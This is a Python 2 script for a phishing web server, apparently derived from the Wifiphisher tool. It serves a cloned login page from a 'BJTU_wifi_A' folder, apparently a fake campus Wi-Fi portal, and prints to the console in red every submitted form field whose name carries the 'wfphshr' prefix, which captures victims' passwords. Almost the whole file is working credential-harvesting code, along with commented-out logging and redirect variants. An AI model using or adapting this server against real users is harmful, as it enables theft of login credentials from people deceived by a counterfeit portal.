import SimpleHTTPServer
import BaseHTTPServer
import httplib
import os
import cgi
import socket
import sys
from threading import Thread

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan

PAGE = "./BJTU_wifi_A"
POST_VALUE_PREFIX = "wfphshr"


class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self):
        """
        Handle one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()


class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):


    def redirect(self, page="/"):
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()
        print('[' + T + '*' + W + '] ' + O + "send '301 rediect' to" + T +
              self.client_address[0] + W + page + "\n"
              )

    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True
        print('[' + T + '*' + W + '] ' + O + "Quit" + T + "\n")

    def do_GET(self):

        if self.path == "/":
            # webserver_tmp = "./webserver.tmp"
            # with open(webserver_tmp, "a+") as log_file:
            #     log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
            #                    self.client_address[0] + W + "\n"
            #                    )
            #     log_file.close()

            self.path = "index.html"
        # self.path = "%s/%s" % (PAGE, self.path)
        self.path = PAGE + '/index.html'

        print('[' + T + '*' + W + '] ' + O + "receive GET from" + T +
              self.client_address[0] + W + self.path + "\n"
              )

        if not os.path.isfile(self.path):
            self.send_response(404)
            print('[' + T + '*' + W + '] ' + O + "send 404 to:" + T +
                  self.client_address[0] + W + self.path + "\n"
                  )
            return

        f = open(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text-html')
        self.end_headers()
        # Send file content to client
        self.wfile.write(f.read())
        print('[' + T + '*' + W + '] ' + O + "send '200 OK' to" + T +
              self.client_address[0] + W + self.path + "\n"
              )
        f.close()
        return

        # if self.path.endswith(".html"):
        #     if not os.path.isfile(self.path):
        #         self.send_response(404)
        #         return
        #     f = open(self.path)
        #     self.send_response(200)
        #     self.send_header('Content-type', 'text-html')
        #     self.end_headers()
        #     # Send file content to client
        #     self.wfile.write(f.read())
        #     f.close()
        #     return
        # Leave binary and other data to default handler.
        # else:
        #     SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        # global terminate
        # redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-type'],
                     })
        if not form.list:
            return
        for item in form.list:
            if item.name and item.value and POST_VALUE_PREFIX in item.name:
                redirect = True
                print('[' + T + '*' + W + '] ' + O + "receive POST from" +
                      T + self.client_address[0] +
                      R + " " + item.name + "=" + item.value +
                      W + "\n"
                      )
                # if redirect == True:
                #     self.redirect("/file.htm")
                #     terminate = True
                #     return
                # self.redirect()
                # # webserver_tmp = "./webserver.tmp"
                # with open(webserver_tmp, "a+") as log_file:
                #     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                #                    T + self.client_address[0] +
                #                    R + " " + item.name + "=" + item.value +
                #                    W + "\n"
                #                    )
                #     log_file.close()
                #     if redirect == True:
                #         self.redirect("/file.htm")
                #         terminate = True
                #         return
                #     self.redirect()

    def log_message(self, format, *args):
        return


def stop_server(port):
    """
    Sends QUIT request to HTTP server running on localhost:<port>
    """
    conn = httplib.HTTPConnection("localhost:%d" % port)
    conn.request("QUIT", "/")
    conn.getresponse()


def start_server(IP, PORT):
    # Start HTTP server in a background thread
    try:
        httpd = HTTPServer((IP, PORT), HTTPRequestHandler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
            '[' + R + '!' + W + '] Try with "sudo .py" or "sudo netstat -nlpt"'
        ))
    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
    # webserver = Thread(target=httpd.serve_forever)
    # webserver.daemon = True
    # webserver.start()
    httpd.serve_forever()


if __name__ == "__main__":
    IP = '127.0.0.1'  # localhost
    # IP = raw_input("IP >")
    PORT = raw_input("PORT >")
    try:
        start_server(IP, int(PORT))
    except KeyboardInterrupt:
        stop_server(PORT)
